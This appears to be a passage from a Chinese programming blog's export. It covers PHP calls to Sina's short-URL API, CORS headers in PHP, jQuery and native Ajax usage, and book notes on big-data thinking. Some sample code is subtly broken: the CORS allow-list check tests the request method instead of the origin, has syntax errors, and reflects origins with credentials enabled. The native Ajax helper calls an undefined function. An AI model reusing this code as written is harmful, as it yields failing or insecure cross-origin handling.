        
          <category> 虚拟化 </category>
        
      </categories>
      <tags>
        
          <tag> docker </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 调用新浪API生成短链接]]></title>
      <url>/php/2018/09/19/php-sina-short-url/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 APIhttp://api.t.sina.com.cn/short_url/shorten.json (返回结果是JSON格式)http://api.t.sina.com.cn/short_url/shorten.xml （返回结果是XML格式）1.1 请求参数source 申请应用时分配的AppKey，调用接口时代表应用的唯一身份。url_long 需要转换的长链接，需要URLencoded，最多不超过20个。1.2 创建source方法进入http://open.weibo.com/ ，选择菜单 微连接-&gt;网站接入。点击立即接入，创建新应用，随便填写应用名称，点击创建。创建成功后，AppKey就是source参数的值，可以用于请求创建短链接。1.3 测试代码Listing 1: 测试代码&lt;?php$api = 'http://api.t.sina.com.cn/short_url/shorten.json'; // json// $api = 'http://api.t.sina.com.cn/short_url/shorten.xml'; // xml$source = '&#24744;&#30003;&#35831;&#30340;AppKey';$url_long = 'http://blog.csdn.net/fdipzone';$request_url = sprintf($api.'?source=%s&amp;url_long=%s', $source, $url_long);$data = file_get_contents($request_url);echo $data;2 Referencesphp 调用新浪API生成短链接]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP-新浪-短链接 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP 跨域问题解决]]></title>
      <url>/php/2018/09/17/php-cross-domain/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 问题概述现代浏览器针对不同域名之间的ajax请求，一般情况下会阻止你获取到ajax返回内容（即使是1.a.com和2.a.com也算跨域）。这是浏览器的为安全性考虑实施的非常重要的安全策略。2 请求跨域问题解决下面通过一个 Ajax 请求示例来说明：2.1 ClientListing 1: 客户端请求代码// &#19978;&#20256;&#25991;&#20214;function upload_idcard_file(_this,type){        var formData = new FormData();        formData.append('type',type);        formData.append('file',_this.files[0]);        $.ajax({                url: '{$upload_file_url}',                type: 'POST',                dataType: 'json',                data: formData,                cache: false,                contentType : false,                processData : false,                headers : {"access_token" : "{$access_token}"},                success:function(d){                        var img_url = d.data;                        img_url = 'http:'+img_url;                        load_img(_this.id,img_url);                },                error:function(err){                        console.log(err);                }        });}2.2 ServerListing 2: 粗糙解决方式// &#20801;&#35768;&#25152;&#26377;&#36328;&#22495;&#35831;&#27714;header('Access-Control-Allow-Origin: *');// &#21482;&#20801;&#35768; http://www.baidu.com &#21457;&#26469;&#30340;&#36328;&#22495;&#35831;&#27714;// header('Access-Control-Allow-Origin: http://www.baidu.com');// &#35774;&#32622;&#25903;&#25345;&#30340; http &#35831;&#27714;&#26041;&#24335;header('Access-Control-Allow-Methods:POST,GET,OPTIONS,PUT,DELETE');// &#20801;&#35768;&#30340;&#21709;&#24212;&#22836;&#23383;&#27573;&#65292;&#35831;&#25353;&#29031;&#33258;&#24049;&#38656;&#27714;&#28155;&#21152;header('Access-Control-Allow-Headers:access_token');Listing 3: 动态判断处理跨域问题if(isset($_SERVER['HTTP_ORIGIN'])){        // &#35831;&#27714;&#26041;&#27861;        $request_method = $_SERVER['REQUEST_METHOD'];        // &#23450;&#20041;&#19968;&#20010;&#20801;&#35768;&#36328;&#22495;&#35831;&#27714;&#25509;&#21475;&#30340;&#22495;&#21517;&#21015;&#34920;&#65292;&#36825;&#37324;&#20320;&#21487;&#20197;&#29992;&#37197;&#32622;&#20063;&#21487;&#20197;&#29992;&#20854;&#23427;&#24418;&#24335;&#65292;&#25105;&#36825;&#37324;&#21482;&#26159;&#29992;$GLOBALS&#31616;&#21333;&#28436;&#31034;&#19968;&#19979;        $allow_origin = array(        'baidu.com',        'bing.com'        );        // &#21028;&#26029;&#26159;&#21542;&#26377;origin&#35831;&#27714;&#22836;        if(in_array($request_method, $allow_origin)        {                header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);                header('Access-Control-Allow-Credentials: true'); // &#23458;&#25143;&#31471;&#25658;&#24102;&#35777;&#20070;&#24335;&#35775;&#38382;&#12290;&#20986;&#20110;&#23433;&#20840;&#32771;&#34385;&#65292;&#35813;&#39033;&#35774;&#32622;&#20026;true&#26102;&#65292;Access-Control-Allow-Origin &#30340;&#20540;&#19981;&#20801;&#35768;&#20026;&#12300;*&#12301;                header('Access-Control-Allow-Methods:POST,GET,OPTIONS,PUT,DELETE');                header('Access-Control-Allow-Headers:x-requested-with,content-type,access_token');        }    }}3 Session 跨域问题解决ini_set('session.cookie_domain', '.a.com');header('Access-Control-Allow-Credentials: true');3.1 参考资料跨域Ajax请求时是否带Cookie的设置]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP-跨域问题 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Ajax]]></title>
      <url>/javascript/2018/09/17/ajax/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 AJAX 简介全称：Asynchronous Javascript and XML，由 Javascript+CSS+DOM+XMLHttpRequest+XSTL+XHTML+XML 七种技术组成，其中技术核心是 XMLHttpRequest。1.1 同步和异步同步：发送方发出数据后，等接收方发回响应以后才发下一个数据包的通讯方式。异步：发送方发出数据后，不等接收方发回响应，接着发送下个数据包的通讯方式。2 XMLHttpRequestListing 1: Ajax 原生代码示例var ajax = {        get:function(url,func){        // XMLHttpRequest &#29992;&#20110;&#22312;&#21518;&#21488;&#19982;&#26381;&#21153;&#22120;&#20132;&#25442;&#25968;&#25454;           var xhr = new XMLHttpRequest();        xhr.open('GET', url, true);        xhr.onreadystatechange = function() {        // readyState == 4 &#35828;&#26126;&#35831;&#27714;&#24050;&#23436;&#25104;        if (xhr.readyState == 4 &amp;&amp; xhr.status == 200 || xhr.status == 304) {                 // &#20174;&#26381;&#21153;&#22120;&#33719;&#24471;&#25968;&#25454;              fn.call(this, xhr.responseText);          }    };    xhr.send();  },  // data &#24212;&#20026; 'a=a1&amp;b=b1' &#36825;&#31181;&#23383;&#31526;&#20018;&#26684;&#24335;&#65292;&#22312; jquery &#37324;&#22914;&#26524; data &#20026;&#23545;&#35937;&#20250;&#33258;&#21160;&#23558;&#23545;&#35937;&#36716;&#25104;&#36825;&#31181;&#23383;&#31526;&#20018;&#26684;&#24335;  post: function (url, data, fn) {    var xhr = new XMLHttpRequest();    xhr.open("POST", url, true);    // &#28155;&#21152; http &#22836;&#65292;&#21457;&#36865;&#20449;&#24687;&#33267;&#26381;&#21153;&#22120;&#26102;&#20869;&#23481;&#32534;&#30721;&#31867;&#22411;    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");      xhr.onreadystatechange = function() {      if (xhr.readyState == 4 &amp;&amp; (xhr.status == 200 || xhr.status == 304)) {        fn.call(this, xhr.responseText);      }    };    xhr.send(data);  }};3 jQuery Ajax3.1 Ajax 参数详解Listing 2: jQuery Ajax 代码格式示例$.ajax({        url: URL, // &#21457;&#36865;&#35831;&#27714;&#30340;&#22320;&#22336;&#65288;&#40664;&#35748;&#20026;&#24403;&#21069;&#39029;&#22320;&#22336;)  type: "POST", // &#35831;&#27714;&#26041;&#24335;&#65306;post/get/put/delete&#65288;&#40664;&#35748;&#20026;get)  timeout: 600, // &#35831;&#27714;&#36229;&#26102;&#26102;&#38388;&#65292;&#21333;&#20301;&#27627;&#31186;  async:true, // true&#65292;&#24322;&#27493;&#35831;&#27714;&#65307;false&#65292;&#21516;&#27493;&#35831;&#27714;&#12290;  cache:false, // true&#65292;&#20174;&#27983;&#35272;&#22120;&#21152;&#36733;&#32531;&#23384;&#65307;false&#65292;&#19981;&#20174;&#27983;&#35272;&#22120;&#21152;&#36733;&#32531;&#23384;  data: JSON.stringify(stream), // &#21457;&#36865;&#21040;&#26381;&#21153;&#22120;&#30340;&#25968;&#25454;&#65292;&#35201;&#27714;&#20026;Object&#25110;String&#31867;&#22411;&#30340;&#21442;&#25968;&#12290;  dataType: "json",// &#39044;&#26399;&#26381;&#21153;&#22120;&#36820;&#22238;&#30340;&#25968;&#25454;&#31867;&#22411;&#12290;&#21487;&#29992;&#30340;&#31867;&#22411;&#26377;:xml,html,script,json,jsonp,text  contentType: "application/json; charset=utf-8", // &#24403;&#21457;&#36865;&#20449;&#24687;&#33267;&#26381;&#21153;&#22120;&#26102;&#65292;&#20869;&#23481;&#32534;&#30721;&#31867;&#22411;&#12290;&#40664;&#35748;&#20026;"application/x-www-form-urlencoded"&#65292;multipart/form-data&#65306;&#26377;&#26102;&#20505;&#20063;&#20250;&#36825;&#20010;&#65292;&#19978;&#20256;&#19979;&#36733;&#21487;&#33021;&#20250;&#29992;&#21040;&#12290;  beforeSend: function(XMLHttpRequest){        // &#35774;&#32622;&#35831;&#27714;&#22836;,&#21152;&#36733;loading&#30028;&#38754;  },  dataFilter:function(){ //&#32473;Ajax&#36820;&#22238;&#30340;&#21407;&#22987;&#25968;&#25454;&#36827;&#34892;&#39044;&#22788;&#29702;&#30340;&#20989;&#25968;&#12290;&#25552;&#20379;data&#21644;type&#20004;&#20010;&#21442;&#25968;&#12290;data&#26159;Ajax&#36820;&#22238;&#30340;&#21407;&#22987;&#25968;&#25454;&#65292;type&#26159;&#35843;&#29992;jQuery.ajax&#26102;&#25552;&#20379;&#30340;dataType&#21442;&#25968;&#12290;        //   },  global:false, //&#34920;&#31034;&#26159;&#21542;&#35302;&#21457;&#20840;&#23616;ajax&#20107;&#20214;&#12290;&#40664;&#35748;&#20026;true&#12290;  ifModified:false, //&#20165;&#22312;&#26381;&#21153;&#22120;&#25968;&#25454;&#25913;&#21464;&#26102;&#33719;&#21462;&#26032;&#25968;&#25454;&#12290;&#26381;&#21153;&#22120;&#25968;&#25454;&#25913;&#21464;&#21028;&#26029;&#30340;&#20381;&#25454;&#26159;Last-Modified&#22836;&#20449;&#24687;&#12290;&#40664;&#35748;&#20540;&#26159;false&#65292;&#21363;&#24573;&#30053;&#22836;&#20449;&#24687;&#12290;  jsonP:"",// &#22312;&#19968;&#20010;jsonp&#35831;&#27714;&#20013;&#37325;&#20889;&#22238;&#35843;&#20989;&#25968;&#30340;&#21517;&#23383;&#12290;   username:"zrg", //&#29992;&#20110;&#21709;&#24212;HTTP&#35775;&#38382;&#35748;&#35777;&#35831;&#27714;&#30340;&#29992;&#25143;&#21517;&#12290;  password:"123456", //&#29992;&#20110;&#21709;&#24212;HTTP&#35775;&#38382;&#35748;&#35777;&#35831;&#27714;&#30340;&#23494;&#30721;&#12290;  processData:false, // &#40664;&#35748;&#24773;&#20917;&#19979;&#65292;&#21457;&#36865;&#30340;&#25968;&#25454;&#23558;&#34987;&#36716;&#25442;&#20026;&#23545;&#35937;&#65288;&#20174;&#25216;&#26415;&#35282;&#24230;&#26469;&#35762;&#24182;&#38750;&#23383;&#31526;&#20018;&#65289;&#20197;&#37197;&#21512;&#40664;&#35748;&#20869;&#23481;&#31867;&#22411;"application/x-www-form-urlencoded"&#12290;&#22914;&#26524;&#35201;&#21457;&#36865;DOM&#26641;&#20449;&#24687;&#25110;&#32773;&#20854;&#20182;&#19981;&#24076;&#26395;&#36716;&#25442;&#30340;&#20449;&#24687;&#65292;&#35831;&#35774;&#32622;&#20026;false&#12290;  scriptCharset:"", //&#21482;&#26377;&#24403;&#35831;&#27714;&#26102;dataType&#20026;"jsonp"&#25110;&#32773;"script"&#65292;&#24182;&#19988;type&#26159;GET&#26102;&#25165;&#20250;&#29992;&#20110;&#24378;&#21046;&#20462;&#25913;&#23383;&#31526;&#38598;(charset)&#12290;&#36890;&#24120;&#22312;&#26412;&#22320;&#21644;&#36828;&#31243;&#30340;&#20869;&#23481;&#32534;&#30721;&#19981;&#21516;&#26102;&#20351;&#29992;&#12290;  complete: function(XMLHttpRequest, textStatus){ // &#35831;&#27714;&#23436;&#25104;&#21518;&#35843;&#29992;&#30340;&#22238;&#35843;&#20989;&#25968;&#65288;&#35831;&#27714;&#25104;&#21151;&#25110;&#22833;&#36133;&#26102;&#22343;&#35843;&#29992;&#65289;        //   },  success: function (data,textStatus) { // &#35831;&#27714;&#25104;&#21151;&#21518;&#35843;&#29992;&#30340;&#22238;&#35843;&#20989;&#25968;&#65292;&#26377;&#20004;&#20010;&#21442;&#25968;: (1)&#30001;&#26381;&#21153;&#22120;&#36820;&#22238;&#65292;&#24182;&#26681;&#25454;dataType&#21442;&#25968;&#36827;&#34892;&#22788;&#29702;&#21518;&#30340;&#25968;&#25454;;(2)&#25551;&#36848;&#29366;&#24577;&#30340;&#23383;&#31526;&#20018;&#12290;        if (data.success) {                //      } else {        //      }  },  error: function(XMLHttpRequest, textStatus, errorThrown){ // &#35831;&#27714;&#22833;&#36133;&#26102;&#34987;&#35843;&#29992;&#30340;&#20989;&#25968;&#12290;&#26377;3&#20010;&#21442;&#25968;&#65292;&#21363;XMLHttpRequest&#23545;&#35937;&#12289;&#38169;&#35823;&#20449;&#24687;&#12289;&#25429;&#33719;&#30340;&#38169;&#35823;&#23545;&#35937;(&#21487;&#36873;)&#12290;        //  }});3.2 常见的 POST 提交数据方式application/x-www-form-urlencoded浏览器的原生 &lt;form&gt; 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。multipart/form-data一般用来上传文件application/json该方案可以方便的提交复杂的数据结构，特别适合 RESTful 的接口。text/xmlXML 结构传输。XML-RPC（XML Remote Procedure Call），它是一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。它的使用也很广泛，如 WordPress 的 XML-RPC Api，搜索引擎的 ping 服务等等。3.3 提交 Form 表单(包括文件上传)3.3.1 常规方法Listing 3: 一般是这样的$.ajax({        url:"${pageContext.request.contextPath}/public/testupload",    type:"post",    data:{username:username},    success:function(data){        window.clearInterval(timer);        //    },    error:function(e){        //    }});// &#25110;&#32773;&#21333;&#19968;&#33719;&#21462;var username = $("#username").val();var password = $("#password").val();...// 以上方式，如果数量少的话，那还没有什么，但是如果数据十分大的话，那就十分的麻烦。3.3.2 使用 FormData 对象// 下面就介绍提高开发效率的方法Listing 4: 使用 FormData 对象（XMLHttpRequest）// FormData&#23545;&#35937;&#26159;html5&#30340;&#19968;&#20010;&#23545;&#35937;&#65292;&#30446;&#21069;&#30340;&#19968;&#20123;&#20027;&#27969;&#30340;&#27983;&#35272;&#22120;&#37117;&#24050;&#32463;&#20860;&#23481;&#12290;var form = new FormData();form.append("username","zxj");form.append("password",123456);var req = new XMLHttpRequest();req.open("post", "${pageContext.request.contextPath}/public/testupload", false);req.send(form);Listing 5: 使用 FormData 对象（jQuery Ajax）var form = new FormData();form.append("username","zxj");form.append("password",123456);$.ajax({        url:"${pageContext.request.contextPath}/public/testupload",    type:"post",    data:form,    processData:false,    contentType:false,    success:function(data){        window.clearInterval(timer);            //    }});3.3.3 使用 jQuery.form.js具体参考https://github.com/jquery-form/form4 ReferencesAjax 百度百科$.ajax({});的各个参数的理解使用ajax提交form表单，包括ajax文件上传]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> Ajax </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[《致胜大数据时代的50种思维方法》]]></title>
      <url>/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/</url>
      <content type="text"><![CDATA[致胜大数据时代的50种思维方法If you have questions, please send email to zrg1390556487@gmail.com.1 前言1.1 什么是大数据最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。”2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。”“大数据”，英文为"Big Dat，，"简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。大数据的信息量有多大？截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。“大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。1.2 改变思维模式，用数据说话来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销……大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书……2 大数据是一场革命2.1 定律思维此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。为什么大数据变成了一个最热门的词汇？主要的原因有两个。第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律：第一个规律是知其然而不必知其所以然，外行打败内行；第二个规律是彻底的价格歧视，商家比你更了解你自己；第三个规律是打破专家的信息优势，病人给医生解惑。2.2 集合思维如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。2.3 创新思维首先，大数据的创新思维可以推动并实现巨大的经济效益。其次，大数据的创新思维可以增强社会管理水平。最后，大数据所具备的创新思维还可以推动和提高安全保障能力。2.4 转型思维以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！2.5 战略思维未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。大数据的价值主要体现在三个方面。第一个方面，是能够实现巨大的商业价值。第二个方面是能够增强社会管理水平。第三个方面是能够提高安全保障能力。3 应对传统模式的大数据思维3.1 扩散思维为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。3.2 颠覆思维在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！3.3 量变思维信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍；人类存储信息量的增长也迅速增长，比世界经济的增长快四倍；曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。3.4 优劣思维事物都是一分为二的，有优势，也有劣势，大数据也是如此。大数据的劣势。首先，大数据存在隐私泄露的情况。其次，大数据只能发现过去，不能左右未来。3.5 冲击思维大数据的冲击力体现在哪些具体方面：第一个方面，大数据正在以无限的增长方式突破有限的增长。第二个方面，大数据正在以效益递增突破。第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。4 新数据时代的新思维4.1 幂律思维幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。幂律和爆发点的相伴相生爆发改变了一切4.2 效率思维大数据的精准和效率大数据能掌控电视剧收视率大数据还能追女朋友4.3 邮件思维邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。大数据时代的邮件营销邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。4.4 定位思维网站零售在挖掘顾客喜好时运用了两种方式。第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。”4.5 